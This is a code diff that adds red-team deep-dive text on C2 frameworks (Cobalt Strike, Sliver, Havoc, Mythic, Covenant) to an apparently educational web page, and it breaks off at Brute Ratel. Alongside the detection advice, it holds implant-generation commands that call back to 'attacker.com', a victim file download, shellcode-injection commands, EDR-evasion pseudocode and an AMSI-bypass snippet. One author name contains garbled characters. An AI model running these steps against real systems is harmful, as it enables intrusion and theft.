@@ -6,8 +6,6 @@ import {
   Paper,
   alpha,
   useTheme,
-  Tabs,
-  Tab,
   Chip,
   Grid,
   Card,
@@ -37,7 +35,7 @@ import {
   LinearProgress,
   useMediaQuery,
 } from "@mui/material";
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import ArrowBackIcon from "@mui/icons-material/ArrowBack";
 import { useNavigate, Link } from "react-router-dom";
 import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
@@ -62,6 +60,8 @@ import SpeedIcon from "@mui/icons-material/Speed";
 import ShieldIcon from "@mui/icons-material/Shield";
 import BugReportIcon from "@mui/icons-material/BugReport";
 import AccountTreeIcon from "@mui/icons-material/AccountTree";
+import HistoryIcon from "@mui/icons-material/History";
+import GroupsIcon from "@mui/icons-material/Groups";
 import PublicIcon from "@mui/icons-material/Public";
 import LightbulbIcon from "@mui/icons-material/Lightbulb";
 import TimelineIcon from "@mui/icons-material/Timeline";
@@ -89,6 +89,102 @@ const c2Frameworks = [
     language: "Java",
     description: "Industry-standard adversary simulation platform with Beacon payload",
     longDescription: "Cobalt Strike is the de facto standard for commercial red team operations. Originally created by Raphael Mudge, it provides a mature, battle-tested platform for adversary simulation. The Beacon payload is highly customizable through Malleable C2 profiles, allowing operators to mimic specific threat actors or blend with legitimate traffic. Its team server model enables collaborative operations with multiple operators working simultaneously.",
+    deepDiveContent: `
+## History & Background
+
+Cobalt Strike was created by **Raphael Mudge** in 2012 as an extension to the Armitage GUI for Metasploit. It evolved into a standalone commercial product and has become the gold standard for professional red team operations. In 2020, HelpSystems (now Fortra) acquired Cobalt Strike, and it continues active development today.
+
+The tool gained notoriety not just for legitimate red team use, but unfortunately also for being weaponized by real threat actors after cracked versions leaked online. This dual-use nature means defenders must understand Cobalt Strike intimately.
+
+## Architecture Deep Dive
+
+### Team Server
+The team server is the central command hub that runs on your attack infrastructure:
+- **Multi-operator support**: Multiple red teamers can connect simultaneously
+- **Data management**: All session data, credentials, and screenshots stored centrally  
+- **Event log**: Comprehensive audit trail of all operator actions
+- **Shared sessions**: Operators can collaborate on the same beacon sessions
+
+### Beacon Payload
+Beacon is Cobalt Strike's signature implant:
+- **Asynchronous communication**: Beacons "check in" periodically rather than maintaining persistent connections
+- **Sleep/Jitter**: Configurable callback intervals (sleep) with randomization (jitter) to evade detection
+- **Malleable C2**: Traffic profiles completely customize network indicators
+- **In-memory execution**: Beacon operates entirely in memory, minimizing disk artifacts
+
+### Malleable C2 Profiles
+These configuration files define every aspect of Beacon's network traffic:
+\`\`\`
+# Example: Mimicking Amazon CDN traffic
+http-get {
+    set uri "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
+    client {
+        header "Accept" "*/*";
+        header "Host" "www.amazon.com";
+        metadata {
+            base64url;
+            prepend "session-token=";
+            header "Cookie";
+        }
+    }
+}
+\`\`\`
+
+## Key Capabilities
+
+### Beacon Object Files (BOFs)
+BOFs revolutionized Cobalt Strike by enabling:
+- Small position-independent code that runs inside Beacon
+- No new process creation required
+- Extends functionality without touching disk
+- Massive community ecosystem of BOFs for everything from AD enumeration to EDR evasion
+
+### Post-Exploitation Features
+- **Mimikatz integration**: Built-in credential harvesting
+- **Kerberoasting/AS-REP roasting**: Active Directory attacks
+- **DCSync**: Domain Controller replication attacks
+- **Golden/Silver tickets**: Kerberos ticket forging
+- **Pass-the-hash/Pass-the-ticket**: Credential reuse
+- **Port forwarding/SOCKS proxy**: Network pivoting
+
+### Aggressor Scripts
+Cobalt Strike's scripting language allows:
+- Automated workflows
+- Custom menus and commands
+- Integration with external tools
+- Event-driven automation
+
+## Detection Indicators
+
+### Network Signatures
+| Indicator | Default Value | Notes |
+|-----------|--------------|-------|
+| JA3 Fingerprint | 72a589da586844d7f0818ce684948eea | Default Java TLS fingerprint |
+| Default URIs | /submit.php, /pixel.gif, /___updatecheck | Easily customized via malleable profiles |
+| Beaconing | Regular intervals with consistent packet sizes | Statistical analysis detects patterns |
+| Certificate | Default self-signed or Let's Encrypt | Analyze cert metadata |
+
+### Host Indicators  
+- Named pipes: \\\\.\\pipe\\msagent_*, \\\\.\\pipe\\MSSE-*
+- Default service name patterns
+- Process injection into rundll32.exe, dllhost.exe
+- Specific memory patterns (YARA rules exist)
+
+### Defensive Recommendations
+1. **JA3 blocking**: Block or alert on known Cobalt Strike JA3 hashes
+2. **Beaconing detection**: Use tools like RITA to identify periodic callbacks
+3. **Memory scanning**: Deploy YARA rules for Beacon patterns
+4. **Named pipe monitoring**: Alert on anomalous named pipe creation
+5. **Certificate analysis**: Flag suspicious certificate patterns
+
+## Learning Resources
+
+- **Official Training**: Cobalt Strike's 4-day Red Team Operations course
+- **Red Team Field Manual**: Covers CS workflows
+- **Raphael Mudge's Blog**: https://blog.cobaltstrike.com
+- **CS Community Kit**: https://cobalt-strike.github.io/community_kit/
+- **Malleable-C2-Profiles**: GitHub repository with community profiles
+    `,
     features: ["Malleable C2 profiles", "Beacon payload", "Team server", "Aggressor scripting", "OPSEC features", "BOF (Beacon Object Files)", "Process injection", "Kerberos attacks", "Lateral movement"],
     protocols: ["HTTP/HTTPS", "DNS", "SMB", "TCP"],
     difficulty: "Advanced",
@@ -96,6 +192,18 @@ const c2Frameworks = [
     url: "https://www.cobaltstrike.com",
     useCases: ["Enterprise red team engagements", "APT simulation", "Purple team exercises", "Adversary emulation"],
     limitations: ["Expensive licensing", "Heavily signatured by defenders", "Cracked versions used by real attackers"],
+    versionHistory: [
+      { version: "4.9", date: "2023", highlights: "Sleep mask improvements, BOF enhancements" },
+      { version: "4.8", date: "2023", highlights: "Post-ex BOFs, arsenal kit updates" },
+      { version: "4.7", date: "2022", highlights: "User-defined reflective loader" },
+      { version: "4.5", date: "2021", highlights: "Process injection improvements" },
+    ],
+    communityResources: [
+      "r/cobaltstrikedev subreddit",
+      "Cobalt Strike Discord (official)",
+      "CS Community Kit GitHub",
+      "ired.team notes",
+    ],
   },
   {
     name: "Sliver",
@@ -103,6 +211,159 @@ const c2Frameworks = [
     language: "Go",
     description: "Modern, cross-platform C2 framework with multiplayer support",
     longDescription: "Developed by BishopFox, Sliver is a modern open-source alternative to commercial C2 frameworks. Written in Go, it produces cross-platform implants for Windows, macOS, and Linux. Sliver's multiplayer mode allows multiple operators to collaborate in real-time, similar to Cobalt Strike's team server. The Armory extension system enables community-contributed tools and capabilities.",
+    deepDiveContent: `
+## History & Background
+
+Sliver was developed by **BishopFox**, a leading offensive security firm, and released as open source in 2019. It was designed to be a modern, freely available alternative to commercial tools like Cobalt Strike. The project has seen rapid adoption in the security community due to its feature-rich design and active development.
+
+Written entirely in **Go**, Sliver benefits from:
+- Cross-compilation to Windows, Linux, and macOS from any platform
+- Statically compiled binaries with no external dependencies
+- Strong cryptographic primitives built into the language
+- Excellent concurrency for handling many simultaneous connections
+
+## Architecture Deep Dive
+
+### Server Architecture
+The Sliver server handles all implant communications and operator interactions:
+\`\`\`
+┌─────────────────────────────────────────────────┐
+│                  Sliver Server                   │
+├──────────────┬──────────────┬──────────────────┤
+│  Listeners   │   Sessions   │    Database      │
+│  (HTTP/DNS/  │  Management  │   (SQLite/       │
+│   mTLS/WG)   │              │    PostgreSQL)   │
+└──────┬───────┴──────┬───────┴────────┬─────────┘
+       │              │                │
+   Implants      Operators         Armory
+\`\`\`
+
+### Implant Types
+
+**Sessions (Interactive)**
+- Persistent connections maintained with the server
+- Lower latency command execution
+- Higher network visibility
+
+**Beacons (Asynchronous)**  
+- Periodic check-ins like Cobalt Strike
+- Better for long-term operations
+- Configurable sleep intervals with jitter
+
+### Communication Protocols
+
+| Protocol | Use Case | Notes |
+|----------|----------|-------|
+| mTLS | Primary secure channel | Mutual TLS with certificate pinning |
+| WireGuard | Encrypted tunnel | Modern VPN protocol, very fast |
+| HTTP(S) | Firewall traversal | Blends with web traffic |
+| DNS | Covert channel | Tunnels data through DNS queries |
+
+### Procedural C2
+Sliver can generate unique C2 profiles per implant using procedural generation:
+- Random URI paths
+- Varied HTTP headers
+- Unique encoding schemes
+- Makes pattern-based detection much harder
+
+## Key Capabilities
+
+### Armory Extension System
+The Armory is Sliver's package manager for extensions:
+\`\`\`bash
+# List available packages
+sliver> armory
+
+# Install Rubeus for Kerberos attacks
+sliver> armory install rubeus
+
+# Install SharpHound for AD enumeration
+sliver> armory install sharphound
+\`\`\`
+
+Popular Armory packages:
+- **Rubeus**: Kerberos abuse toolkit
+- **SharpHound**: BloodHound data collector
+- **Seatbelt**: Security posture assessment
+- **Certify**: AD Certificate Services attacks
+
+### Pivoting Capabilities
+\`\`\`bash
+# SOCKS5 proxy through implant
+sliver> socks5 start
+
+# Port forwarding
+sliver> portfwd add -l 8080 -r 10.0.0.1:80
+
+# WireGuard tunnel for full network access
+sliver> wg-portfwd add --bind 0.0.0.0:51820 --remote 10.0.0.0/24
+\`\`\`
+
+### Multiplayer Mode
+Multiple operators can connect simultaneously:
+\`\`\`bash
+# Generate operator config
+./sliver-server operator --name alice --lhost team.example.com
+
+# Operators connect with their configs
+./sliver-client import alice.cfg
+\`\`\`
+
+## Detection Indicators
+
+### Network Signatures
+| Indicator | Details |
+|-----------|---------|
+| Default mTLS port | 8888 |
+| Go TLS fingerprint | Various, depends on Go version |
+| DNS patterns | High-entropy subdomains |
+| HTTP patterns | Binary data in response bodies |
+
+### Host Indicators
+- Process genealogy anomalies
+- Memory patterns for implant detection
+- Unusual outbound connections from non-browser processes
+
+### Defensive Recommendations
+1. Monitor for mTLS connections on non-standard ports
+2. Analyze DNS query patterns for tunneling indicators
+3. Profile Go binary execution on endpoints
+4. Implement network segmentation to limit lateral movement
+
+## Getting Started Tutorial
+
+\`\`\`bash
+# 1. Download latest release
+curl -sL https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux -o sliver-server
+chmod +x sliver-server
+
+# 2. Start the server (generates certs on first run)
+./sliver-server
+
+# 3. Create a listener
+sliver> mtls --lhost 0.0.0.0 --lport 8888
+
+# 4. Generate an implant
+sliver> generate --mtls attacker.com:8888 --os windows --arch amd64 --save implant.exe
+
+# 5. When implant executes, interact with session
+sliver> sessions
+sliver> use <session-id>
+
+# 6. Run commands
+sliver (IMPLANT)> whoami
+sliver (IMPLANT)> ps
+sliver (IMPLANT)> download C:\\\\Users\\\\admin\\\\Desktop\\\\secrets.txt
+\`\`\`
+
+## Learning Resources
+
+- **Official Documentation**: https://sliver.sh/docs
+- **BishopFox Blog**: Attack techniques and Sliver tutorials
+- **GitHub Discussions**: Community Q&A
+- **YouTube**: Multiple walkthrough videos available
+- **Sliver Armory**: https://github.com/sliverarmory
+    `,
     features: ["Implant generation", "Multiplayer mode", "Armory extensions", "Staging support", "mTLS security", "WireGuard tunnels", "DNS canaries", "Procedural C2", "HTTPS certificate pinning"],
     protocols: ["HTTP/HTTPS", "DNS", "mTLS", "WireGuard"],
     difficulty: "Intermediate",
@@ -110,6 +371,17 @@ const c2Frameworks = [
     url: "https://github.com/BishopFox/sliver",
     useCases: ["Budget-conscious red teams", "Cross-platform operations", "Learning C2 concepts", "Open-source alternative to CS"],
     limitations: ["Less mature than Cobalt Strike", "Smaller community", "Fewer ready-made integrations"],
+    versionHistory: [
+      { version: "1.5.x", date: "2023-2024", highlights: "Improved evasion, new extensions" },
+      { version: "1.4.x", date: "2022", highlights: "Beacon mode, traffic shaping" },
+      { version: "1.3.x", date: "2021", highlights: "Armory system introduced" },
+    ],
+    communityResources: [
+      "GitHub Discussions",
+      "BishopFox Discord",
+      "Sliver Armory GitHub",
+      "#sliver on various security Discords",
+    ],
   },
   {
     name: "Havoc",
@@ -117,6 +389,173 @@ const c2Frameworks = [
     language: "C/C++/Go",
     description: "Modern C2 framework with advanced evasion and a clean UI",
     longDescription: "Havoc is a relatively new open-source C2 framework that focuses heavily on EDR evasion. The Demon agent uses advanced techniques like indirect syscalls, sleep obfuscation, and memory encryption to evade modern endpoint detection. Its clean Qt-based GUI provides an intuitive interface for operators, and the modular architecture allows for easy extension.",
+    deepDiveContent: `
+## History & Background
+
+Havoc was created by **C5pทder** (Paul Ungur) and released in 2022 as a modern, open-source C2 framework specifically designed to evade modern EDR solutions. Unlike older frameworks that were retrofitted with evasion capabilities, Havoc was built from the ground up with EDR bypass as a core design principle.
+
+The framework gained rapid adoption in the red team community due to:
+- Native EDR evasion techniques
+- Clean, modern GUI built with Qt
+- Active development and community engagement
+- Open-source availability
+
+## Architecture Deep Dive
+
+### Component Overview
+\`\`\`
+┌────────────────────────────────────────────────────┐
+│                  Havoc Teamserver                   │
+│                    (Go/C++)                         │
+├────────────────┬──────────────┬───────────────────┤
+│   Listeners    │   Database   │   Operator API    │
+│  (HTTP/SMB)    │   (SQLite)   │   (WebSocket)     │
+└───────┬────────┴──────────────┴─────────┬─────────┘
+        │                                  │
+    Demon                           Havoc Client
+    Agents                          (Qt GUI)
+\`\`\`
+
+### The Demon Agent
+
+The **Demon** is Havoc's implant, written primarily in C with assembly components for low-level operations:
+
+**Memory Architecture:**
+- Operates entirely in memory
+- Heap/stack encryption during sleep
+- Position-independent code design
+- No static strings - all APIs resolved at runtime
+
+**Execution Flow:**
+\`\`\`
+1. Initial execution
+2. Resolve ntdll.dll base address
+3. Resolve required syscalls via SSN extraction
+4. Unmap/remap ntdll if needed (unhooking)
+5. Establish C2 connection
+6. Enter check-in loop with sleep obfuscation
+\`\`\`
+
+## Evasion Techniques Deep Dive
+
+### Indirect Syscalls
+Instead of calling syscall stubs in ntdll.dll (where EDR hooks reside), Havoc:
+1. Reads the System Service Number (SSN) from ntdll
+2. Constructs the syscall instruction manually
+3. Executes from its own code, bypassing hooks
+
+\`\`\`c
+// Pseudocode for indirect syscall
+NTSTATUS IndirectSyscall(DWORD ssn, ...) {
+    // SSN extracted from ntdll, syscall executed from Demon memory
+    asm volatile(
+        "mov r10, rcx\\n"
+        "mov eax, %[ssn]\\n"
+        "syscall\\n"
+        : : [ssn] "r" (ssn)
+    );
+}
+\`\`\`
+
+### Sleep Obfuscation
+During sleep periods, the Demon:
+1. **Encrypts** its heap and stack segments
+2. **Spoofs** the return address stack
+3. **Changes** memory permissions to non-executable
+4. **Queues** an APC to wake and decrypt
+
+This prevents memory scanners from finding implant signatures while sleeping.
+
+### Return Address Spoofing
+When calling Windows APIs:
+- Real return address is hidden
+- Spoofed address points to legitimate code (e.g., kernel32.dll)
+- Defeats call stack analysis by EDRs
+
+### Stack Duplication
+Some EDRs scan the current thread's stack:
+- Havoc copies the stack to a new location
+- Encrypts the original
+- Decrypts and restores after operation
+
+## Key Capabilities
+
+### BOF Support
+Havoc supports Cobalt Strike-compatible BOFs:
+\`\`\`
+demon> inline-execute /path/to/bof.o arg1 arg2
+demon> bof-load dir_list
+\`\`\`
+
+### Module System
+Extend functionality without modifying core:
+- Custom modules loaded at runtime
+- PowerShell execution
+- .NET assembly loading
+- Shellcode injection
+
+### Process Manipulation
+\`\`\`
+demon> proc list                    # List processes
+demon> proc kill 1234               # Kill process
+demon> shellcode inject x64 1234 /path/shellcode.bin
+demon> proc ppidspoof               # Parent PID spoofing
+\`\`\`
+
+## Detection Considerations
+
+### What Havoc Beats
+- ✓ Userland API hooking
+- ✓ Call stack analysis (basic)
+- ✓ Memory pattern scanning (during sleep)
+- ✓ ETW tracing (with patches)
+
+### What Can Still Detect
+- Kernel-level visibility (ETW-Ti)
+- Hardware breakpoints
+- Hypervisor-based monitoring
+- Network traffic analysis
+- Behavioral analysis over time
+
+### Detection Strategies
+1. **Kernel callbacks**: Monitor from kernel mode
+2. **Hardware telemetry**: CPU event monitoring
+3. **Network analysis**: HTTP patterns, beaconing
+4. **Anomaly detection**: Unusual process behaviors
+
+## Getting Started Tutorial
+
+\`\`\`bash
+# Clone the repository
+git clone https://github.com/HavocFramework/Havoc.git
+cd Havoc
+
+# Build teamserver
+cd teamserver
+go build
+./teamserver server --profile ./profiles/havoc.yaotl
+
+# Build client (needs Qt5)
+cd ../client
+mkdir build && cd build
+cmake ..
+make
+./Havoc
+
+# In the GUI:
+# 1. Add new listener (HTTP)
+# 2. Create Demon payload
+# 3. Deploy and interact
+\`\`\`
+
+## Learning Resources
+
+- **GitHub Wiki**: https://github.com/HavocFramework/Havoc/wiki
+- **C5pทder's Blog**: Technical deep-dives
+- **YouTube**: Multiple tutorial videos
+- **Discord**: Active community support
+- **Source code**: Learn evasion techniques by reading implementation
+    `,
     features: ["Demon agent", "Sleep obfuscation", "Indirect syscalls", "BOF support", "Module system", "Custom shellcode", "Return address spoofing", "Stack duplication", "Heap encryption"],
     protocols: ["HTTP/HTTPS", "SMB"],
     difficulty: "Intermediate",
@@ -124,6 +563,15 @@ const c2Frameworks = [
     url: "https://github.com/HavocFramework/Havoc",
     useCases: ["EDR evasion testing", "Modern Windows environments", "Advanced red team operations"],
     limitations: ["Windows-focused", "Less mature", "Smaller community", "Documentation gaps"],
+    versionHistory: [
+      { version: "0.6", date: "2023", highlights: "Module system, improved stability" },
+      { version: "0.5", date: "2022", highlights: "Initial public release" },
+    ],
+    communityResources: [
+      "Havoc Discord Server",
+      "GitHub Issues/Discussions",
+      "Twitter/X #havocframework",
+    ],
   },
   {
     name: "Mythic",
@@ -131,6 +579,207 @@ const c2Frameworks = [
     language: "Go/Python",
     description: "Collaborative, multi-platform red team framework with web UI",
     longDescription: "Mythic takes a unique approach by being agent-agnostic - it provides the C2 infrastructure while allowing operators to use different agent implementations (called 'Payload Types'). Built on Docker, it's easy to deploy and manage. The web-based UI provides real-time updates, task tracking, and comprehensive reporting capabilities.",
+    deepDiveContent: `
+## History & Background
+
+Mythic was created by **Cody Thomas** (@its_a_feature_) and has evolved through several major versions. Originally known as "Apfell" (focused on macOS), it was redesigned as Mythic to support any operating system through its modular agent architecture.
+
+The key innovation of Mythic is its **agent-agnostic design**:
+- The Mythic server provides the infrastructure
+- Agents (Payload Types) are separate projects
+- New agents can be developed without modifying the core
+- Community contributes diverse agent implementations
+
+## Architecture Deep Dive
+
+### Docker-Based Architecture
+\`\`\`
+┌────────────────── Docker Compose Stack ──────────────────┐
+│                                                           │
+│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────┐  │
+│  │   Mythic    │  │   Mythic    │  │    Mythic       │  │
+│  │   Server    │  │   React     │  │    Postgres     │  │
+│  │   (Go)      │  │   (Web UI)  │  │    (Database)   │  │
+│  └──────┬──────┘  └─────────────┘  └─────────────────┘  │
+│         │                                                 │
+│  ┌──────┴──────────────────────────────────────────────┐ │
+│  │              RabbitMQ Message Bus                    │ │
+│  └──────────────────────────────────────────────────────┘ │
+│         │                 │                    │          │
+│  ┌──────┴───┐     ┌──────┴───┐        ┌──────┴───┐      │
+│  │  Apollo  │     │ Poseidon │        │  Medusa  │      │
+│  │  Agent   │     │  Agent   │        │  Agent   │      │
+│  └──────────┘     └──────────┘        └──────────┘      │
+└───────────────────────────────────────────────────────────┘
+\`\`\`
+
+### Payload Types (Agents)
+
+Each agent is a separate Docker container that communicates via RabbitMQ:
+
+| Agent | Language | Platforms | Specialty |
+|-------|----------|-----------|-----------|
+| Apollo | C# | Windows | Full-featured, AD attacks |
+| Poseidon | Go | Linux/macOS/Windows | Cross-platform |
+| Medusa | Python | Linux/macOS/Windows | Cross-platform, extensible |
+| Athena | C# | Linux/macOS/Windows | .NET cross-platform |
+| Merlin | Go | Linux/macOS/Windows | HTTP/2, QUIC support |
+| Hannibal | C | Windows | EDR evasion focus |
+
+### C2 Profiles
+C2 Profiles define how agents communicate:
+- **HTTP**: Standard web traffic
+- **SMB**: Named pipe communication
+- **TCP**: Direct TCP connections  
+- **WebSocket**: Real-time bidirectional
+- **Custom**: Build your own!
+
+## Key Capabilities
+
+### Real-Time Web Interface
+The React-based UI provides:
+- **Live callbacks**: Instant notification of new agents
+- **Task tracking**: Visual status of all commands
+- **File browser**: Navigate target file systems
+- **Process browser**: Interactive process management
+- **Credential manager**: Centralized credential storage
+- **Graph views**: Visualize agent relationships
+
+### Task Management
+\`\`\`
+Every task has:
+├── Status (submitted → processing → processed)
+├── Operator who submitted
+├── Timestamp
+├── Full output and errors
+├── Artifacts generated
+└── MITRE ATT&CK mapping
+\`\`\`
+
+### Scripting & Automation
+Mythic provides a full REST API and Python scripting:
+\`\`\`python
+from mythic import mythic_rest
+
+# Connect to Mythic
+mythic = mythic_rest.Mythic(
+    username="mythic_admin",
+    password="password",
+    server_ip="localhost",
+    server_port=7443
+)
+
+# Get all callbacks
+async def list_callbacks():
+    callbacks = await mythic.get_all_callbacks()
+    for cb in callbacks:
+        print(f"{cb.id} - {cb.host} - {cb.user}")
+\`\`\`
+
+### Reporting
+Built-in reporting includes:
+- Timeline of all operations
+- MITRE ATT&CK mapping
+- Artifact tracking
+- Credential summary
+- Exportable formats
+
+## Agent Development
+
+Mythic makes custom agent development straightforward:
+
+### Agent Structure
+\`\`\`
+my_agent/
+├── Dockerfile
+├── rabbitmq_config.json
+├── agent_functions/
+│   ├── builder.py          # Payload generation
+│   ├── shell.py            # shell command
+│   ├── upload.py           # file upload
+│   └── ...
+├── payload/
+│   └── agent_code/         # Actual agent source
+└── mythic/
+    └── agent_config.json   # Agent metadata
+\`\`\`
+
+### Adding a Command
+\`\`\`python
+# agent_functions/whoami.py
+from mythic_container.MythicCommandBase import *
+
+class WhoamiArguments(TaskArguments):
+    def __init__(self, command_line, **kwargs):
+        super().__init__(command_line, **kwargs)
+
+class WhoamiCommand(CommandBase):
+    cmd = "whoami"
+    description = "Get current user context"
+    
+    async def create_go_tasking(self, taskData):
+        return BrowserScriptResponse(task=taskData.Task)
+\`\`\`
+
+## Detection Considerations
+
+### Network Indicators
+- Default ports: 7443 (UI), customizable for C2
+- HTTP patterns depend on C2 profile
+- Potential for HTTP/2 and QUIC (Merlin agent)
+
+### Host Indicators
+- Agent-specific (varies by payload type)
+- Apollo: .NET assembly indicators
+- Poseidon: Go binary characteristics  
+- Container-based infrastructure is distinctive
+
+### Defensive Recommendations
+1. Monitor for Docker deployment patterns
+2. Profile specific agent behaviors
+3. Network traffic analysis for C2 patterns
+4. Correlation of callbacks with other activity
+
+## Getting Started Tutorial
+
+\`\`\`bash
+# 1. Clone Mythic
+git clone https://github.com/its-a-feature/Mythic
+cd Mythic
+
+# 2. Run installer
+./install_docker_ubuntu.sh  # For Ubuntu
+# or
+./install_docker_macos.sh   # For macOS
+
+# 3. Start Mythic
+./mythic-cli start
+
+# 4. Install an agent (e.g., Apollo)
+./mythic-cli install github https://github.com/MythicAgents/Apollo
+
+# 5. Install a C2 profile
+./mythic-cli install github https://github.com/MythicC2Profiles/http
+
+# 6. Access web UI
+# URL: https://localhost:7443
+# Credentials in .env file (or ./mythic-cli config)
+
+# 7. In the UI:
+# - Create a new payload with Apollo + HTTP
+# - Download and deploy
+# - Interact via the callbacks tab
+\`\`\`
+
+## Learning Resources
+
+- **Official Docs**: https://docs.mythic-c2.net/
+- **GitHub**: https://github.com/its-a-feature/Mythic
+- **Agent Repos**: https://github.com/MythicAgents
+- **C2 Profiles**: https://github.com/MythicC2Profiles
+- **YouTube**: Mythic walkthrough videos
+- **Cody Thomas's Blog**: Technical articles
+    `,
     features: ["Agent agnostic", "Docker-based", "Real-time updates", "Task tracking", "Reporting", "Multiple payload types", "SOCKS proxying", "File browser", "Process browser", "Credential management"],
     protocols: ["HTTP/HTTPS", "TCP", "SMB", "WebSocket"],
     difficulty: "Intermediate",
@@ -138,6 +787,17 @@ const c2Frameworks = [
     url: "https://github.com/its-a-feature/Mythic",
     useCases: ["Custom agent development", "Multi-platform operations", "Team collaboration", "Educational purposes"],
     limitations: ["Resource intensive", "Learning curve for custom agents", "Docker dependency"],
+    versionHistory: [
+      { version: "3.x", date: "2023-2024", highlights: "React UI, improved performance" },
+      { version: "2.x", date: "2021-2022", highlights: "Major rewrite, new agent system" },
+      { version: "1.x", date: "2019-2020", highlights: "Original Apfell design" },
+    ],
+    communityResources: [
+      "Mythic Documentation",
+      "GitHub Discussions",
+      "BloodHound Slack - #mythic channel",
+      "Twitter @its_a_feature_",
+    ],
   },
   {
     name: "Covenant",
@@ -145,6 +805,161 @@ const c2Frameworks = [
     language: "C#/.NET",
     description: ".NET-based C2 framework with collaborative features",
     longDescription: "Covenant is a .NET-based C2 framework designed for collaborative red team operations. It uses 'Grunt' implants that leverage the .NET runtime for execution, making it particularly effective in Windows enterprise environments. The web interface provides task management, listener configuration, and real-time collaboration features.",
+    deepDiveContent: `
+## History & Background
+
+Covenant was created by **Ryan Cobb** (@coaborr) and released in 2019. It was designed as a .NET-focused alternative to PowerShell-based frameworks at a time when PowerShell was becoming heavily monitored.
+
+Key motivations:
+- PowerShell script block logging made PS attacks visible
+- AMSI was blocking obfuscated PowerShell
+- Organizations weren't monitoring .NET as closely
+- Need for collaborative red team tooling
+
+**Note**: Development has slowed significantly since 2021. The project is still functional but may lack recent evasion updates.
+
+## Architecture Deep Dive
+
+### Component Overview
+\`\`\`
+┌─────────────────── Covenant Architecture ───────────────────┐
+│                                                              │
+│  ┌──────────────────────────────────────────────────────┐   │
+│  │            Covenant Server (ASP.NET Core)             │   │
+│  ├────────────────┬──────────────┬─────────────────────┤   │
+│  │   Listeners    │   Database   │    Web Interface    │   │
+│  │   (HTTP/SMB)   │   (SQLite)   │    (Blazor)         │   │
+│  └───────┬────────┴──────────────┴─────────────────────┘   │
+│          │                                                   │
+│   ┌──────┴──────┐                                           │
+│   │    Grunt    │  ← .NET assembly executed on targets      │
+│   │   Implants  │                                           │
+│   └─────────────┘                                           │
+└──────────────────────────────────────────────────────────────┘
+\`\`\`
+
+### Grunt Implants
+Grunts are .NET assemblies that execute in target environments:
+- Written in C#
+- Can be compiled to various formats (EXE, DLL, PS1)
+- Support for .NET Framework and .NET Core
+- Customizable templates
+
+### Listeners
+| Type | Description |
+|------|-------------|
+| HTTP | Standard HTTP/HTTPS communication |
+| Bridge | Link listeners across network segments |
+| SMB | Named pipe for internal pivoting |
+
+## Key Capabilities
+
+### Task-Based Model
+\`\`\`csharp
+// Grunt task execution flow
+1. Operator submits task in web UI
+2. Task queued in database
+3. Grunt checks in and receives task
+4. Grunt executes and returns results
+5. Results displayed in UI
+\`\`\`
+
+### GruntTask Library
+Pre-built tasks include:
+- **Assembly**: Load and execute .NET assemblies
+- **Shell/ShellCmd**: Command execution
+- **PowerShell**: PS execution via runspace
+- **Upload/Download**: File transfers
+- **Token manipulation**: Impersonation attacks
+- **Credential access**: Mimikatz-style attacks
+
+### Graph Visualization
+UI shows relationships between:
+- Listeners and Grunts
+- Pivoting paths
+- Operator activities
+
+### Templates
+Covenant's template system allows:
+- Custom implant code
+- Modified evasion techniques
+- Build-time obfuscation
+
+## .NET Tradecraft
+
+### Why .NET for Red Teams?
+- Enterprise environments run .NET
+- Less monitored than PowerShell historically
+- In-memory execution via Assembly.Load()
+- Access to Windows APIs via P/Invoke
+
+### Execution Flow
+\`\`\`
+1. Stage delivery (various methods)
+2. .NET runtime loads Grunt assembly
+3. Grunt establishes C2 communication
+4. Tasks execute via reflection
+5. Results serialized and returned
+\`\`\`
+
+### AMSI Bypass
+Covenant tasks can include AMSI patches:
+\`\`\`csharp
+// Example AMSI bypass pattern
+var amsi = LoadLibrary("amsi.dll");
+var amsiScan = GetProcAddress(amsi, "AmsiScanBuffer");
+// Patch to return clean result
+\`\`\`
+
+## Detection Considerations
+
+### Network Indicators
+- HTTP callback patterns
+- .NET assembly transfer sizes
+- Base64 in headers (default)
+- Predictable URI paths (customizable)
+
+### Host Indicators
+- .NET assembly loading events (ETW)
+- CLR profiler events
+- Unusual processes loading CLR
+- Memory patterns of Grunt
+
+### Defensive Recommendations
+1. Enable .NET ETW providers
+2. Monitor for Assembly.Load() patterns
+3. Flag unusual .NET assembly execution
+4. Network traffic analysis for beaconing
+
+## Getting Started
+
+\`\`\`bash
+# Clone repository
+git clone https://github.com/cobbr/Covenant
+cd Covenant/Covenant
+
+# Build and run (requires .NET Core SDK)
+dotnet build
+dotnet run
+
+# Access web interface
+# https://localhost:7443
+# Create admin account on first run
+
+# In the UI:
+# 1. Create HTTP Listener
+# 2. Create Launcher (PowerShell, Binary, etc.)
+# 3. Execute launcher on target
+# 4. Interact with Grunt in Grunt tab
+\`\`\`
+
+## Learning Resources
+
+- **GitHub**: https://github.com/cobbr/Covenant
+- **Ryan Cobb's Blog**: Technical articles
+- **Wiki**: https://github.com/cobbr/Covenant/wiki
+- **YouTube**: Setup and operation tutorials
+    `,
     features: ["Grunt implants", "Web interface", "Task management", ".NET execution", "Listener management", "Graph visualization", "Template customization", "API access", "Multi-user support"],
     protocols: ["HTTP/HTTPS", "SMB"],
     difficulty: "Intermediate",
@@ -152,6 +967,15 @@ const c2Frameworks = [
     url: "https://github.com/cobbr/Covenant",
     useCases: [".NET environments", "Windows-focused operations", "Learning C2 development"],
     limitations: ["Development appears stalled", ".NET dependency on targets", "Windows-centric"],
+    versionHistory: [
+      { version: "0.6", date: "2021", highlights: "Last significant update" },
+      { version: "0.5", date: "2020", highlights: ".NET Core support" },
+    ],
+    communityResources: [
+      "GitHub Wiki",
+      "Archived discussions",
+      "Community forks",
+    ],
   },
   {
     name: "Brute Ratel C4",
@@ -159,6 +983,153 @@ const c2Frameworks = [
     language: "C/C++",
     description: "Red team & adversary simulation framework focused on EDR evasion",
     longDescription: "Brute Ratel C4 (BRc4) was developed by Chetan Nayak (Paranoid Ninja) with a specific focus on evading modern EDR solutions. The 'Badger' agent uses direct syscalls, sleep masking, memory encryption, and other advanced techniques to remain undetected. It's become popular for operations against well-defended enterprise environments.",
+    deepDiveContent: `
+## History & Background
+
+Brute Ratel C4 was created by **Chetan Nayak** (known as Paranoid Ninja), a former CrowdStrike red teamer who understood EDR internals deeply. The framework was released commercially in late 2020 as a purpose-built EDR evasion platform.
+
